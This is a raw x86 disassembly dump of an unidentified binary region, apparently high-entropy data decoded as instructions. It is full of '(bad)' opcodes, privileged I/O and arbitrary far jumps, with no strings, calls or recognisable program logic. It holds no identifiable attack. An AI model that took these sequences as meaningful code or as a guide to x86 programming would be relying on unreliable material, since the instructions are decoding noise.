  41ab0d:	arpl   WORD PTR [eax-0x25],si
  41ab10:	int    0xfd
  41ab12:	mov    ch,0x9f
  41ab14:	adc    esp,DWORD PTR [edx-0x6e2cd5a3]
  41ab1a:	mov    ebp,DWORD PTR [ebx+0x3]
  41ab1d:	ins    BYTE PTR es:[edi],dx
  41ab1e:	inc    eax
  41ab1f:	jae    0x41aaf9
  41ab21:	dec    edx
  41ab22:	and    eax,DWORD PTR [ebx]
  41ab24:	popf   
  41ab25:	ficom  WORD PTR [ebp+0x410ee190]
  41ab2b:	add    al,0xf8
  41ab2d:	std    
  41ab2e:	cli    
  41ab2f:	repz adc bl,BYTE PTR [eax+0x27]
  41ab33:	lods   al,BYTE PTR ds:[esi]
  41ab34:	xchg   BYTE PTR [edi+0xe36331a],ch
  41ab3a:	or     DWORD PTR [ebx+0x6cfb6927],esp
  41ab40:	stos   BYTE PTR es:[edi],al
  41ab41:	push   es
  41ab42:	and    BYTE PTR [ebx+0x692ebedd],0x83
  41ab49:	adc    DWORD PTR [ecx],esp
  41ab4b:	push   es
  41ab4c:	test   ch,dl
  41ab4e:	inc    ecx
  41ab4f:	push   ss
  41ab50:	nop
  41ab51:	jbe    0x41abc7
  41ab53:	ds xor dh,bh
  41ab56:	mov    ds:0xdcacd48f,eax
  41ab5b:	test   eax,0xfc365c45
  41ab60:	adc    BYTE PTR [ecx+edx*2+0x5f],bh
  41ab64:	push   ecx
  41ab65:	xchg   ebp,eax
  41ab66:	mov    al,ds:0xb4fb8c66
  41ab6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab6c:	push   0x323439e4
  41ab71:	mov    ebp,0xfcec5c19
  41ab76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab77:	fs retf 
  41ab79:	(bad)  
  41ab7a:	sub    eax,0x426ea574
  41ab7f:	loope  0x41ab53
  41ab81:	mov    WORD PTR [edx+esi*1-0x3ce48ea1],ds
  41ab88:	or     al,dh
  41ab8a:	pusha  
  41ab8b:	aas    
  41ab8c:	dec    eax
  41ab8d:	lds    ecx,FWORD PTR [ecx]
  41ab8f:	sbb    edx,DWORD PTR [eax+0x60a2bd81]
  41ab95:	pop    eax
  41ab96:	ror    BYTE PTR [eax],cl
  41ab98:	shl    dh,1
  41ab9a:	mov    ecx,0x4052ebfb
  41ab9f:	sub    eax,0x67b66dc8
  41aba4:	and    BYTE PTR [esi+0x3c],ch
  41aba7:	lods   al,BYTE PTR ds:[esi]
  41aba8:	mov    ecx,DWORD PTR [eax+eiz*2]
  41abab:	jmp    0x76bc42e7
  41abb0:	ds push eax
  41abb2:	shl    DWORD PTR [edi-0x1da329a6],0x92
  41abb9:	stc    
  41abba:	mov    ds:0xf6c3da10,eax
  41abbf:	xchg   BYTE PTR [eax+0x54dac1f5],dl
  41abc5:	stos   DWORD PTR es:[edi],eax
  41abc6:	adc    ebx,edx
  41abc8:	es lahf 
  41abca:	rcr    cl,1
  41abcc:	mov    edi,0xcd60090e
  41abd2:	fld    TBYTE PTR [ebx-0x4c04e849]
  41abd8:	and    dl,bh
  41abda:	sub    BYTE PTR [edx],0xca
  41abdd:	sub    al,0x8b
  41abdf:	ret    
  41abe0:	dec    esp
  41abe1:	rcl    BYTE PTR [ecx+0x6134587],0x54
  41abe8:	or     esi,DWORD PTR [edi+esi*4+0x1b]
  41abec:	inc    DWORD PTR [ecx-0xfd03059]
  41abf2:	pop    edi
  41abf3:	sub    eax,0xb5a7ee1
  41abf8:	aad    0x73
  41abfa:	mov    eax,ds:0xf877a06f
  41abff:	cmp    al,BYTE PTR [edi+0xc]
  41ac02:	mov    dh,0x36
  41ac04:	(bad)  
  41ac06:	pop    edx
  41ac07:	or     dl,cl
  41ac09:	or     DWORD PTR [edi-0x19f315c4],eax
  41ac0f:	or     DWORD PTR [eax+eax*1],ecx
	...
  41ac72:	add    BYTE PTR [eax],al
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edi+esi*8-0x37]
  41ac82:	cmp    dh,BYTE PTR [ecx+0x11c49]
  41ac88:	add    eax,0x49000001
  41ac8d:	xchg   DWORD PTR [esi-0x6e],edx
  41ac90:	mov    edi,0xb0e2192f
  41ac95:	or     BYTE PTR [esi-0x66],dh
  41ac98:	loop   0x41acab
  41ac9a:	pop    edx
  41ac9b:	rcr    DWORD PTR [edi],cl
  41ac9d:	sub    eax,0x9694b293
  41aca2:	xor    BYTE PTR [edi*4+0xd7efd7f],ch
  41aca9:	mov    ecx,DWORD PTR gs:[esi+ecx*1-0x36]
  41acae:	js     0x41acb7
  41acb0:	das    
  41acb1:	data16 scas al,BYTE PTR es:[edi]
  41acb3:	dec    ebp
  41acb4:	xor    dl,ch
  41acb6:	pop    ecx
  41acb7:	retf   0x396e
  41acba:	mov    ebp,DWORD PTR [edx+0x164e3c34]
  41acc0:	dec    esp
  41acc1:	dec    esi
  41acc2:	inc    ebp
  41acc3:	add    DWORD PTR [eax-0x2437ec16],eax
  41acc9:	mov    ds:0x2a55e5d6,eax
  41acce:	mov    ds:0x695d5c94,eax
  41acd3:	outs   dx,BYTE PTR ds:[esi]
  41acd4:	popa   
  41acd5:	adc    ch,BYTE PTR [ebp-0x10a33767]
  41acdb:	out    0xf5,eax
  41acdd:	cli    
  41acde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acdf:	das    
  41ace0:	pop    esi
  41ace1:	xor    al,0x20
  41ace3:	repnz fs xor al,0xd8
  41ace7:	mov    esp,0x18490e20
  41acec:	mov    ah,0xd7
  41acee:	outs   dx,DWORD PTR ds:[esi]
  41acef:	sti    
  41acf0:	(bad)
  41acf3:	ror    BYTE PTR [esi+ebp*4-0x391e6ca1],0xbc
  41acfb:	dec    ecx
  41acfc:	out    0x38,al
  41acfe:	jns    0x41ace5
  41ad00:	cmc    
  41ad01:	aad    0xcf
  41ad03:	and    DWORD PTR [esi+0x19],edi
  41ad06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad07:	pop    ecx
  41ad08:	(bad)  
  41ad09:	fwait
  41ad0a:	(bad)  
  41ad0b:	aas    
  41ad0c:	xlat   BYTE PTR ds:[ebx]
  41ad0d:	aam    0xc8
  41ad0f:	cdq    
  41ad10:	je     0x41ad34
  41ad12:	mov    cl,0x21
  41ad14:	ret    0x434d
  41ad17:	arpl   WORD PTR [esi],bx
  41ad19:	les    edi,FWORD PTR [eax-0x3949e9e1]
  41ad1f:	mov    eax,ds:0x2f85bd3b
  41ad24:	or     edi,DWORD PTR ds:0x87946e4e
  41ad2a:	push   edi
  41ad2b:	jl     0x41acd1
  41ad2d:	inc    eax
  41ad2e:	(bad)  
  41ad2f:	stos   BYTE PTR es:[edi],al
  41ad30:	in     al,dx
  41ad31:	int3   
  41ad32:	aam    0xc5
  41ad34:	push   edi
  41ad35:	test   eax,0x9f60de3e
  41ad3a:	inc    eax
  41ad3b:	cmp    ebp,ebx
  41ad3d:	add    dl,BYTE PTR ds:0x239f5ab
  41ad43:	push   ecx
  41ad44:	les    eax,FWORD PTR [esi+0x3c6a4082]
  41ad4a:	mov    cl,0x4d
  41ad4c:	fcom   QWORD PTR [ebx+0x3e6e86e7]
  41ad52:	sub    edi,DWORD PTR [edi+0x2cbdc198]
  41ad58:	mov    dh,0xe3
  41ad5a:	shl    DWORD PTR [ebx+0x43],0x39
  41ad5e:	test   BYTE PTR [esi-0x73a0b1da],cl
  41ad64:	repz add BYTE PTR [edx-0x32801adf],bh
  41ad6b:	sub    BYTE PTR fs:[edx],ch
  41ad6e:	jle    0x41ada2
  41ad70:	dec    ebx
  41ad71:	shr    DWORD PTR [edi+ecx*4],1
  41ad74:	ror    BYTE PTR [esi-0x5c],1
  41ad77:	sbb    ah,BYTE PTR [bx+di]
  41ad7a:	scas   eax,DWORD PTR es:[edi]
  41ad7b:	pop    esp
  41ad7c:	test   DWORD PTR [ecx],edx
  41ad7e:	sahf   
  41ad7f:	ss jne 0x41add0
  41ad82:	pop    esp
  41ad83:	sub    eax,0xd5edc7b9
  41ad88:	ss js  0x41ad70
  41ad8b:	mov    ds:0xbd09098,al
  41ad90:	add    BYTE PTR ds:[eax],al
	...
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebx+ecx*8+0x4ec2ecf8],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	es inc edi
  41ae0e:	ror    DWORD PTR [edi],cl
  41ae10:	dec    edi
  41ae11:	inc    eax
  41ae12:	popf   
  41ae13:	cmp    al,0xf6
  41ae15:	cmp    BYTE PTR [eax-0x3b],0x73
  41ae19:	or     cl,dl
  41ae1b:	ins    DWORD PTR es:[edi],dx
  41ae1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1d:	or     al,0xe0
  41ae1f:	push   0x45e74385
  41ae24:	xor    al,0x58
  41ae26:	add    al,0x2
  41ae28:	mov    ebp,0xd22d31a2
  41ae2d:	mov    ch,0xc
  41ae2f:	xchg   esp,eax
  41ae30:	sbb    al,0xfa
  41ae32:	xchg   ebx,eax
  41ae33:	arpl   WORD PTR [edx-0x3fe81bfe],sp
  41ae39:	cmp    bl,BYTE PTR [ebx]
  41ae3b:	sub    eax,0x2b86d30b
  41ae40:	popa   
  41ae41:	add    edi,ecx
  41ae43:	add    al,0x5e
  41ae45:	and    eax,DWORD PTR [edi-0x5a284484]
  41ae4b:	inc    ebx
  41ae4c:	in     eax,0xcf
  41ae4e:	es sbb al,al
  41ae51:	and    BYTE PTR [ebx+0x0],al
  41ae54:	(bad)  
  41ae55:	retf   
  41ae56:	sbb    esp,ecx
  41ae58:	ficom  WORD PTR [edx]
  41ae5a:	fnstsw WORD PTR ds:0x3ee05802
  41ae60:	add    dl,al
  41ae62:	pop    ecx
  41ae63:	mov    bh,0x76
  41ae65:	jp     0x41ae9f
  41ae67:	adc    eax,esp
  41ae69:	mov    al,ds:0xc9a46e0f
  41ae6e:	call   0x79bedacf
  41ae73:	sub    eax,0x6c9b0395
  41ae78:	out    0xa2,al
  41ae7a:	sub    cl,BYTE PTR [eax-0x1]
  41ae7d:	mov    ecx,ebx
  41ae7f:	mov    bh,0x1f
  41ae81:	sub    eax,DWORD PTR [bx]
  41ae84:	mov    ebp,0x1477a025
  41ae89:	sub    dl,al
  41ae8b:	les    ebp,FWORD PTR [edx-0x2bb137f]
  41ae91:	mul    BYTE PTR [edi-0x57a9012b]
  41ae97:	pop    eax
  41ae98:	jne    0x41ae61
  41ae9a:	add    eax,0x953b3c85
  41ae9f:	retf   
  41aea0:	jmp    0x41ae55
  41aea2:	cmp    al,0xb5
  41aea4:	add    ah,al
  41aea6:	lds    eax,FWORD PTR [eax]
  41aea8:	mov    ch,0x26
  41aeaa:	xor    ebx,DWORD PTR [edi+0x1ba9d295]
  41aeb0:	xchg   edi,eax
  41aeb1:	pop    esp
  41aeb2:	mov    ah,0x89
  41aeb4:	xor    BYTE PTR [edx+0x4534f2f],al
  41aeba:	sbb    BYTE PTR [esi+esi*8-0x741d73f4],bl
  41aec1:	mov    BYTE PTR [ecx+edi*4-0x1b],dh
  41aec5:	fist   DWORD PTR [eax-0x5cc62755]
  41aecb:	mov    bl,bl
  41aecd:	inc    esi
  41aece:	mov    edi,DWORD PTR [esi]
  41aed0:	cmp    BYTE PTR [ecx],0x1a
  41aed3:	lahf   
  41aed4:	or     al,0xa0
  41aed6:	aaa    
  41aed7:	ret    
  41aed8:	dec    ebp
  41aed9:	lods   al,BYTE PTR ds:[esi]
  41aeda:	jae    0x41af34
  41aedc:	daa    
  41aedd:	jge    0x563d728b
  41aee3:	out    0x4f,eax
  41aee5:	and    DWORD PTR [eax-0x64efeca9],edx
  41aeeb:	rcr    BYTE PTR [edx],0x35
  41aeee:	and    DWORD PTR [edi],eax
  41aef0:	cli    
  41aef1:	push   ds
  41aef2:	fldcw  WORD PTR [ebp+edx*4+0x3a]
  41aef6:	adc    ecx,DWORD PTR [ebx+0x67]
  41aef9:	xchg   edi,eax
  41aefa:	into   
  41aefb:	mov    al,0x73
  41aefd:	pop    edi
  41aefe:	jmp    0xb9af:0x33a7114a
  41af05:	repz test eax,0xbd72a9f9
  41af0b:	cdq    
  41af0c:	pop    edx
  41af0d:	sbb    DWORD PTR [esi+0x3b],edx
  41af10:	xchg   edi,eax
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xad8644ee
  41af82:	(bad)  
  41af83:	hlt    
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xcb000001
  41af8d:	inc    bp
  41af8f:	sahf   
  41af90:	push   0x5aa9a56c
  41af95:	retf   
  41af96:	mov    al,0xf2
  41af98:	std    
  41af99:	fnstcw WORD PTR [edx]
  41af9b:	adc    DWORD PTR [edi],edi
  41af9d:	cmc    
  41af9e:	jo     0x41afec
  41afa0:	push   ds
  41afa1:	(bad)  
  41afa2:	out    0xdb,al
  41afa4:	and    al,ah
  41afa6:	cmp    eax,0xc470db67
  41afab:	jl     0x41af52
  41afad:	inc    ebx
  41afae:	(bad)
  41afb1:	cli    
  41afb2:	pushf  
  41afb3:	jns    0x41af7f
  41afb5:	dec    eax
  41afb6:	adc    eax,DWORD PTR [ebp-0x1c]
  41afb9:	xchg   BYTE PTR [eax],bl
  41afbb:	nop
  41afbc:	lahf   
  41afbd:	push   0xffffffac
  41afbf:	inc    ebp
  41afc0:	dec    ebx
  41afc1:	fisub  DWORD PTR [ebp-0x6d17fdc6]
  41afc7:	popa   
  41afc8:	sub    BYTE PTR [edx+0x5123b39f],0x69
  41afcf:	jecxz  0x41af65
  41afd1:	jmp    0xced3:0xdc32e606
  41afd8:	mov    WORD PTR [edi+0x39],ss
  41afdb:	fisubr DWORD PTR [ecx+0x3d]
  41afde:	sub    DWORD PTR [ecx+eax*1+0x63],0x20c8d37a
  41afe6:	inc    ecx
  41afe7:	pushf  
  41afe8:	out    0xf0,eax
  41afea:	and    al,0x9b
  41afec:	test   BYTE PTR [esi],0x4c
  41afef:	push   edx
  41aff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aff1:	cmp    ebx,ebx
  41aff3:	xor    BYTE PTR ds:0x3952cf3e,ch
  41aff9:	mov    edi,0x6e88664b
  41affe:	add    eax,0xeb9d6acf
  41b003:	push   edx
  41b004:	adc    eax,0xc53c0b05
  41b009:	jp     0x41afe1
  41b00b:	push   ebp
  41b00c:	sbb    edi,ebp
  41b00e:	sub    esp,DWORD PTR [esi+0x4dd01c12]
  41b014:	jno    0x41afbd
  41b016:	or     dl,BYTE PTR [esi+edi*2+0x6f]
  41b01a:	dec    edx
  41b01b:	lahf   
  41b01c:	and    al,0xed
  41b01e:	ror    DWORD PTR [esi-0x39],0x1a
  41b022:	mov    bh,0x7d
  41b024:	add    ebx,esi
  41b026:	outs   dx,DWORD PTR ds:[esi]
  41b027:	mov    bh,0xb8
  41b029:	inc    edx
  41b02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b02b:	sbb    al,0xb9
  41b02d:	lock sar DWORD PTR [edi],0xe0
  41b031:	inc    edi
  41b032:	test   BYTE PTR [ecx],bl
  41b034:	xor    eax,0xc4efbbcc
  41b039:	jbe    0x41afe9
  41b03b:	push   ebp
  41b03c:	fimul  WORD PTR [ecx]
  41b03e:	fbstp  TBYTE PTR [ecx-0x79422f06]
  41b044:	dec    esp
  41b045:	gs push 0xe499a393
  41b04b:	jl     0x41b05c
  41b04d:	enter  0x7a14,0x8d
  41b051:	loopne 0x41b076
  41b053:	pop    edx
  41b054:	adc    al,0x76
  41b056:	jb     0x41afdf
  41b058:	pop    ebp
  41b059:	out    dx,al
  41b05a:	in     eax,dx
  41b05b:	sbb    esi,edx
  41b05d:	jbe    0x41b0db
  41b05f:	mov    bh,0x99
  41b061:	or     eax,0xf03e1a6e
  41b066:	addr16 push edx
  41b068:	test   BYTE PTR ds:0x56b0fc90,bh
  41b06e:	pop    ebp
  41b06f:	mov    WORD PTR [eax+0x51],es
  41b072:	inc    edx
  41b073:	pusha  
  41b074:	pop    ecx
  41b075:	sahf   
  41b076:	loopne 0x41b0e8
  41b078:	sub    ebp,DWORD PTR [eax+0x3ab5064a]
  41b07e:	xor    eax,0xd70c4dea
  41b083:	imul   esi,DWORD PTR [edx+0x2f190dba],0x4f216fa8
  41b08d:	sub    eax,0x604292
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xc62ed752
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xe0000001
  41b10d:	test   BYTE PTR [edi+0x502c3a62],bl
  41b113:	ret    
  41b114:	pop    edx
  41b115:	cmp    al,0xf9
  41b117:	sar    BYTE PTR [ebp+0x40e89510],0xa3
  41b11e:	mov    ?,WORD PTR [ebx-0x51]
  41b121:	mov    eax,ds:0x5152ae54
  41b126:	loopne 0x41b162
  41b128:	sub    al,0xee
  41b12a:	push   0xffffffaa
  41b12c:	out    dx,eax
  41b12d:	push   ds
  41b12e:	loope  0x41b0da
  41b130:	adc    eax,0xb1640a9
  41b135:	pop    es
  41b136:	lods   al,BYTE PTR ds:[esi]
  41b137:	or     bl,BYTE PTR [edi+0x61]
  41b13a:	in     eax,dx
  41b13b:	stc    
  41b13c:	and    dh,bl
  41b13e:	retf   
  41b13f:	cmp    al,BYTE PTR ds:0xaabd3a2
  41b145:	or     eax,0x95a13b1a
  41b14a:	out    dx,eax
  41b14b:	cli    
  41b14c:	inc    ebp
  41b14d:	imul   ecx,DWORD PTR [edx+0x73],0x3c
  41b151:	mov    dh,0x1e
  41b153:	repnz and BYTE PTR ds:0xcecb996c,0x6d
  41b15b:	shl    esi,0xa
  41b15e:	fisubr DWORD PTR [ecx+0x29022122]
  41b164:	loope  0x41b116
  41b166:	mov    bl,0xe0
  41b168:	add    al,0x4c
  41b16a:	dec    edx
  41b16b:	sub    al,0x31
  41b16d:	fcomp  DWORD PTR [ecx+0x1fcf03dc]
  41b173:	sub    ch,BYTE PTR [eax+0x12]
  41b176:	xchg   BYTE PTR [ecx],bh
  41b178:	push   ecx
  41b179:	dec    ebx
  41b17a:	dec    ecx
  41b17b:	sar    DWORD PTR [ebp+0x72],cl
  41b17e:	push   ebx
  41b17f:	sbb    dl,bl
  41b181:	adc    DWORD PTR [eax],ecx
  41b183:	bound  edi,QWORD PTR [eax+edx*8+0x5f]
  41b187:	sub    BYTE PTR [edi],ah
  41b189:	sub    dl,BYTE PTR [eax-0x7b4a3496]
  41b18f:	mov    WORD PTR [ecx+0x5f317eee],ds
  41b195:	das    
  41b196:	daa    
  41b197:	xor    esi,DWORD PTR [edi]
  41b199:	ret    0xd74
  41b19c:	jnp    0x41b1b4
  41b19e:	icebp  
  41b19f:	jle    0x41b1ff
  41b1a1:	jg     0x41b213
  41b1a3:	imul   ecx,esp,0x9f00b3a6
  41b1a9:	inc    esi
  41b1aa:	fcmovne st,st(4)
  41b1ac:	mov    al,0xda
  41b1ae:	push   ds
  41b1af:	psllq  mm6,mm1
  41b1b2:	outs   dx,DWORD PTR ds:[esi]
  41b1b3:	nop
  41b1b4:	push   esi
  41b1b5:	arpl   WORD PTR [ecx+ebx*4-0x11c6330],bp
  41b1bc:	fs jmp 0xfc89:0x992a9773
  41b1c4:	imul   edx,DWORD PTR [eax+0x66c7a00],0xf
  41b1cb:	stos   BYTE PTR es:[edi],al
  41b1cc:	mov    ebp,0x9b5671e8
  41b1d1:	sbb    edi,esi
  41b1d3:	mov    edx,0x1dc94239
  41b1d8:	xchg   ebx,eax
  41b1d9:	dec    ecx
  41b1da:	pop    ds
  41b1db:	mov    al,ds:0x6441a65e
  41b1e0:	mov    dl,0xea
  41b1e2:	daa    
  41b1e3:	cmp    bl,dh
  41b1e5:	ins    BYTE PTR es:[edi],dx
  41b1e6:	mov    dl,0x1
  41b1e8:	jg     0x41b1bf
  41b1ea:	inc    ebx
  41b1eb:	dec    eax
  41b1ec:	rcl    BYTE PTR [ebp+0x36],cl
  41b1ef:	fadd   DWORD PTR [esi+0x6]
  41b1f2:	mov    ds:0xd32d74da,al
  41b1f7:	push   esi
  41b1f8:	add    DWORD PTR [edx-0x59],ebx
  41b1fb:	push   ebp
  41b1fc:	or     al,0xe9
  41b1fe:	arpl   WORD PTR [ecx],bp
  41b200:	inc    ecx
  41b201:	lahf   
  41b202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b203:	sbb    DWORD PTR [esi-0x2e51a23c],ebp
  41b209:	sbb    al,0xdc
  41b20b:	pop    ecx
  41b20c:	jle    0x41b279
  41b20e:	jns    0x41b1f5
  41b210:	pop    eax
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [eax-0x63],bl
  41b282:	ins    DWORD PTR es:[di],dx
  41b284:	pop    ebp
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0x3a000001,al
  41b28d:	mov    eax,0x4266c5bc
  41b292:	inc    esi
  41b293:	ret    0x524e
  41b296:	in     al,dx
  41b297:	stos   DWORD PTR es:[edi],eax
  41b298:	ins    BYTE PTR es:[edi],dx
  41b299:	daa    
  41b29a:	in     eax,dx
  41b29b:	xchg   edx,eax
  41b29c:	mov    ?,WORD PTR [edx+ecx*2-0x2f]
  41b2a0:	sbb    ebp,ecx
  41b2a2:	repz inc edi
  41b2a4:	jmp    0x41b226
  41b2a6:	cmp    eax,0x7d690f1b
  41b2ab:	sub    DWORD PTR [edi+0x65],esp
  41b2ae:	mov    bh,0x8a
  41b2b0:	rcl    BYTE PTR [esi],0xd0
  41b2b3:	jbe    0x41b25c
  41b2b5:	cmp    bl,BYTE PTR [edi]
  41b2b7:	add    BYTE PTR [ecx+eiz*2],bl
  41b2ba:	sar    al,0x5d
  41b2bd:	mov    esp,0x14197cca
  41b2c2:	pop    eax
  41b2c3:	or     dh,BYTE PTR [ecx+0x50def382]
  41b2c9:	xchg   ebp,eax
  41b2ca:	pop    edi
  41b2cb:	jno    0x41b342
  41b2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ce:	fmul   DWORD PTR [edx+0x5c]
  41b2d1:	xor    DWORD PTR [edi+edi*2+0x10],edx
  41b2d5:	mov    cl,0x76
  41b2d7:	jo     0x41b2b9
  41b2d9:	mov    edi,0x373c68da
  41b2de:	mov    dh,0x27
  41b2e0:	in     al,0xf3
  41b2e2:	jle    0x41b33a
  41b2e4:	arpl   sp,cx
  41b2e6:	sahf   
  41b2e7:	and    eax,0xb6854f8c
  41b2ec:	mov    esp,0x29812905
  41b2f1:	push   0xce64520d
  41b2f6:	mov    eax,0x854092b5
  41b2fb:	(bad)  
  41b2fc:	pushf  
  41b2fd:	xor    eax,0xd1cbaa54
  41b302:	mov    bh,0x36
  41b305:	jno    0x41b310
  41b307:	shl    BYTE PTR [edx],cl
  41b309:	imul   sp,ax,0x6e
  41b30d:	mov    ds:0x8668e495,al
  41b312:	cmp    DWORD PTR [ebx],ecx
  41b314:	xchg   esp,eax
  41b315:	push   cs
  41b316:	mov    gs,WORD PTR [eax+0x1b61d063]
  41b31c:	fimul  WORD PTR [esi]
  41b31e:	push   edx
  41b31f:	xor    al,0x5a
  41b321:	cld    
  41b322:	and    BYTE PTR [ebx-0x7e],ch
  41b325:	in     al,dx
  41b326:	jmp    0xeab8b56
  41b32b:	dec    ebx
  41b32c:	ror    dl,0xcd
  41b32f:	mov    cl,BYTE PTR [ecx+0x21c19c5a]
  41b335:	push   es
  41b336:	ret    
  41b337:	sub    ch,BYTE PTR [edx-0x14]
  41b33a:	jns    0x41b39f
  41b33c:	clc    
  41b33d:	jb     0x41b360
  41b33f:	imul   esi,DWORD PTR [ecx-0xd4172b1],0x34
  41b346:	inc    ebx
  41b347:	xor    al,0x41
  41b349:	lahf   
  41b34a:	cs mov edi,0xb2d72395
  41b350:	dec    edx
  41b351:	jb     0x41b3c8
  41b353:	adc    al,0x74
  41b355:	jge    0x41b309
  41b357:	aas    
  41b358:	imul   DWORD PTR [ecx-0x72]
  41b35b:	cmp    bh,BYTE PTR [eax+esi*1-0x4b]
  41b35f:	arpl   WORD PTR [edi-0x45],dx
  41b362:	add    dh,ah
  41b364:	mov    eax,0xe8381e44
  41b369:	pop    edi
  41b36a:	or     al,0xb7
  41b36c:	push   0x9d8411e3
  41b371:	shl    DWORD PTR [esi-0x7d8887db],0xac
  41b378:	in     al,dx
  41b379:	mov    cl,0x56
  41b37b:	popf   
  41b37c:	cmp    bl,0xd4
  41b37f:	jne    0x41b3df
  41b381:	add    eax,0x2f92e992
  41b386:	out    0x32,al
  41b388:	(bad)  
  41b389:	not    BYTE PTR [ecx+0x0]
  41b38c:	dec    edi
  41b38d:	pop    ebx
  41b38e:	or     al,0x8c
  41b390:	retf   0x0
	...
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	sbb    al,BYTE PTR [edx+0x76]
  41b403:	xchg   BYTE PTR [edx+0x21],ah
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0xcd000001
  41b40d:	mov    ebx,0xacddd40
  41b412:	repz and DWORD PTR [eax+0x45],ebx
  41b416:	aam    0xb0
  41b418:	push   0x405f3e7c
  41b41d:	outs   dx,DWORD PTR ds:[esi]
  41b41e:	mov    WORD PTR ds:0xc2140f82,ss
  41b424:	hlt    
  41b425:	(bad)  
  41b426:	stos   DWORD PTR es:[edi],eax
  41b427:	pop    edi
  41b428:	or     eax,0x1d22defb
  41b42d:	rcl    DWORD PTR [edi-0x34a4a0a9],0xae
  41b434:	int    0x66
  41b436:	mov    dh,0x88
  41b438:	add    DWORD PTR [ebx+0x3fe52fc7],ecx
  41b43e:	or     ecx,0xd7641dfa
  41b444:	and    DWORD PTR [ebx+0xc3d89bc],eax
  41b44a:	inc    eax
  41b44b:	(bad)  
  41b44c:	xor    eax,0xe8fdf10b
  41b451:	nop
  41b452:	xor    eax,0x74deb724
  41b457:	icebp  
  41b458:	test   eax,esp
  41b45a:	mov    BYTE PTR [eax],bl
  41b45c:	adc    BYTE PTR [edx+eax*8-0x4271a850],cl
  41b463:	xor    ebp,eax
  41b465:	mov    edi,0xaab1dc82
  41b46a:	lahf   
  41b46b:	es popa 
  41b46d:	inc    edi
  41b46e:	xor    BYTE PTR [ebx+0x26],ch
  41b471:	pop    ebp
  41b472:	daa    
  41b473:	push   ebx
  41b474:	cmp    cl,cl
  41b476:	test   BYTE PTR gs:[edi+0x5c],dl
  41b47a:	and    al,BYTE PTR [edi-0xb]
  41b47d:	and    BYTE PTR [edi+0x1c],dl
  41b480:	cmp    DWORD PTR ds:0xa9c730b6,esp
  41b486:	retf   
  41b487:	arpl   bp,bp
  41b489:	enter  0x8503,0x86
  41b48d:	mov    al,ds:0x3f18c906
  41b492:	mov    bl,0x12
  41b494:	dec    esi
  41b495:	cdq    
  41b496:	(bad)  
  41b497:	rcr    BYTE PTR [edi],cl
  41b499:	add    eax,0x60b9030b
  41b49e:	and    bl,dh
  41b4a0:	add    BYTE PTR [ecx],0xd8
  41b4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4a4:	cli    
  41b4a5:	fadd   st,st(4)
  41b4a7:	in     eax,dx
  41b4a8:	imul   ebx,ebp,0x71
  41b4ab:	fwait
  41b4ac:	shr    BYTE PTR [ebx+edi*8],0x1f
  41b4b0:	pop    es
  41b4b1:	(bad)  
  41b4b2:	iret   
  41b4b3:	add    eax,edx
  41b4b5:	ds in  eax,dx
  41b4b7:	clc    
  41b4b8:	or     edi,DWORD PTR [ebx-0x53]
  41b4bb:	call   0x64d3:0x126e2b41
  41b4c2:	push   ss
  41b4c3:	jo     0x41b51f
  41b4c5:	mov    al,0x74
  41b4c7:	xchg   edx,eax
  41b4c8:	pop    ebx
  41b4c9:	push   ecx
  41b4ca:	or     DWORD PTR [ebp-0x58],esp
  41b4cd:	jno    0x41b47a
  41b4cf:	aas    
  41b4d0:	xlat   BYTE PTR ds:[ebx]
  41b4d1:	xchg   esi,eax
  41b4d2:	xchg   ebx,eax
  41b4d3:	stos   BYTE PTR es:[edi],al
  41b4d4:	mov    DWORD PTR [edi],esp
  41b4d6:	jecxz  0x41b52d
  41b4d8:	inc    edx
  41b4d9:	mov    edx,DWORD PTR [esi]
  41b4db:	cmp    BYTE PTR [edi-0x2b0ae503],0xf4
  41b4e2:	ja     0x41b503
  41b4e4:	push   0xffffffbd
  41b4e6:	or     eax,0xa15475df
  41b4eb:	out    dx,al
  41b4ec:	hlt    
